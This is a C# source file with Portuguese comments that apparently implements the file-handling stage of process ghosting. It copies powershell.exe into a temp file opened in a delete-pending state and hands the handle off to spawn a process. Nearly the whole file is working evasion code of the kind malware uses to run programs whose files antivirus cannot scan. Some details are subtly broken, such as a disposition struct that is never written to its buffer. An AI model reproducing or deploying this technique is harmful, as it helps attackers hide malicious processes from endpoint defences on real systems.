using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

namespace pi
{
    class FileOperations
    {
        private static IntPtr OpenFileInDeleteState(string temp_filename)
        {
            Win32.NTSTATUS convertUnicode = Win32.RtlInitUnicodeString(
                out Win32.UNICODE_STRING DestinationString,
                @"\??\" + temp_filename
            );

            if (DestinationString.Length == 0)
            {
                throw new Exception($"RtlInitUnicodeString ERROR! Code: {Marshal.GetLastWin32Error()}");
            }

            IntPtr unicodePtr = Marshal.AllocHGlobal(Marshal.SizeOf(DestinationString));
            Marshal.StructureToPtr( // aqui, nós criamos um espaço de memória do tamanho do 'DestinationString'. posteriormente, o marshal do objeto ('DestinationString') ao bloco de memória não gerenciado recém-criado.
                DestinationString,
                unicodePtr,
                false // pode causar memory leak!
            );
            
            Win32.OBJECT_ATTRIBUTES oa = new Win32.OBJECT_ATTRIBUTES();
            Win32.IO_STATUS_BLOCK isb = new Win32.IO_STATUS_BLOCK();

            oa.Length = Marshal.SizeOf(oa);
            oa.ObjectName = unicodePtr;
            oa.RootDirectory = IntPtr.Zero;
            oa.Attributes = 0x40; // OBJ_CASE_INSENSITIVE
            oa.SecurityDescriptor = IntPtr.Zero;
            oa.SecurityQualityOfService = IntPtr.Zero;

            Win32.NTSTATUS openFile = Win32.NtOpenFile(
                out IntPtr hDeleteFile,
                Win32.FileAccessRights.Delete | Win32.FileAccessRights.Synchronize | Win32.FileAccessRights.GenericRead | Win32.FileAccessRights.GenericWrite, // importante o Win32.FileAccessRights.Delete
                ref oa,
                out isb,
                FileShare.Read | FileShare.Write,
                0x00000000 | 0x00000020 // FILE_SUPERSEDE e FILE_SYNCHRONOUS_IO_NONALERT 
            );

            if (openFile != Win32.NTSTATUS.Success || hDeleteFile == IntPtr.Zero)
            {
                throw new Exception($"NtOpenFile ERROR! Status: {openFile}");
            }
            return hDeleteFile;
        }
        public static void FileSettings()
        {
            IntPtr hCreateFile = Win32.CreateFileW(
                @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", // vai ser o binário spawnado na injeção
                FileAccess.Read,
                FileShare.Read,
                IntPtr.Zero,
                FileMode.OpenOrCreate,
                FileAttributes.Normal,
                IntPtr.Zero
            );
            
            if(hCreateFile == IntPtr.Zero)
            {
                throw new Exception($"CreateFileW ERROR! Code: {Marshal.GetLastWin32Error()}");
            }

            IntPtr hMappingFile = Win32.CreateFileMapping(
                hCreateFile,
                IntPtr.Zero,
                Win32.PageProtection.Readonly,
                0,
                0,
                string.Empty
            );

            if(hMappingFile == IntPtr.Zero)
            {
                throw new Exception($"CreateFileMapping ERROR! Code: {Marshal.GetLastWin32Error()}");
            }

            IntPtr hViewMappingFile = Win32.MapViewOfFileEx( // hViewMappingFile = endereço de memória do mapeamento
                hMappingFile,
                Win32.FileMapAccessType.Read,
                0,
                0,
                UIntPtr.Zero,
                IntPtr.Zero
            );

            if(hViewMappingFile == IntPtr.Zero)
            {
                throw new Exception($"MapViewOfFileEx ERROR! Code: {Marshal.GetLastWin32Error()}");
            }

            bool getFileSizeBool = Win32.GetFileSizeEx(
                hCreateFile,
                out long lpFileSize
            );

            if (getFileSizeBool == false)
            {
                throw new Exception($"GetFileSizeEx ERROR! Code: {Marshal.GetLastWin32Error()}");
            }
            
            Console.WriteLine($"\nCreateFileW() SUCCESS! Handle: {hCreateFile}");
            Console.WriteLine($"CreateFileMapping() SUCCESS! Handle: {hMappingFile}");
            Console.WriteLine($"MapViewOfFileEx() SUCCESS! Memory: {hViewMappingFile}");
            
            IntPtr memAlloc = Win32.VirtualAlloc( // alocando memória no processo local do tamanho do arquivo (hCreateFile)
                IntPtr.Zero,
                (uint)lpFileSize,
                Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
                Win32.MemoryProtection.ReadWrite
            );

            IntPtr copyMemoryPtr = Win32.memcpy(memAlloc, hViewMappingFile, (UIntPtr)lpFileSize);
            if (memAlloc == IntPtr.Zero || copyMemoryPtr == IntPtr.Zero)
            {
                throw new Exception($"VirtualAlloc ERROR! Code: {Marshal.GetLastWin32Error()}");
            }

            // 260 = max value
            StringBuilder temp_path = new StringBuilder(260);
            StringBuilder temp_filename = new StringBuilder(260);

            uint getTempPath = Win32.GetTempPath(
                260,
                temp_path
            );

            if (getTempPath == 0)
            {
                throw new Exception($"GetTempPath ERROR! Code: {Marshal.GetLastWin32Error()}");
            }

            uint createTempFile = Win32.GetTempFileName(
                temp_path,
                "DEMO", // máximo de 3 caracteres como prefixo
                0,
                temp_filename
            );

            Console.WriteLine($"\nVirtualAlloc() SUCCESS! Memory: {memAlloc}");
            Console.WriteLine($"GetTempPath() SUCCESS! Size: {getTempPath}");
            Console.WriteLine($"\nTemp Filename: {temp_filename}");

            IntPtr hDeleteFile = OpenFileInDeleteState(temp_filename.ToString()); // levando para a função de abrir o arquivo temporário (temp_filename) em estado de exclusão pendente *crucial*

            Win32.FILE_DISPOSITION_INFO fdi = new Win32.FILE_DISPOSITION_INFO();
            fdi.DeleteFile = true;

            IntPtr hglobal = Marshal.AllocHGlobal(Marshal.SizeOf(fdi));
            if (hglobal == IntPtr.Zero)
            {
                throw new Exception($"AllocHGlobal ERROR! Code: {Marshal.GetLastWin32Error()}");
            }

            Win32.NTSTATUS setInformationDeleteFile = Win32.NtSetInformationFile(
                hDeleteFile,
                out Win32.IO_STATUS_BLOCK isb, // alterei de ref pra out, se der erro olha aqui kk
                hglobal,
                Marshal.SizeOf(fdi),
                Win32.FILE_INFORMATION_CLASS.FileDispositionInformation
            );

            if (setInformationDeleteFile != Win32.NTSTATUS.Success || isb.status != Win32.NTSTATUS.Success)
            {
                throw new Exception($"NtSetInformationFile ERROR! Status: {setInformationDeleteFile}");
            }

            Win32.NTSTATUS writeDeleteFile = Win32.NtWriteFile(
                hDeleteFile,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out Win32.IO_STATUS_BLOCK _,
                memAlloc,
                lpFileSize,
                IntPtr.Zero,
                IntPtr.Zero
            );

            if (writeDeleteFile != Win32.NTSTATUS.Success)
            {
                throw new Exception($"NtWriteFile ERROR! Status: {writeDeleteFile}");
            }

            bool getDeleteFileSizeBool = Win32.GetFileSizeEx(
                hDeleteFile,
                out long lpDeleteFileSize
            );

            if (getDeleteFileSizeBool == false || lpDeleteFileSize == 0) // quase impossível de dar erro também
            {
               throw new Exception($"GetFileSizeEx (Delete File) ERROR! Code: {Marshal.GetLastWin32Error()}"); 
            }

            Console.WriteLine($"\nNtOpenFile() SUCCESS! Handle: {hDeleteFile}");
            Console.WriteLine($"NtSetInformationFile() SUCCESS! Status: {isb.status}");
            Console.WriteLine($"GetFileSizeEx() SUCCESS! Status: {getDeleteFileSizeBool}");

            ProcessOperations.ProcessSettings(hDeleteFile);
        }
    }
}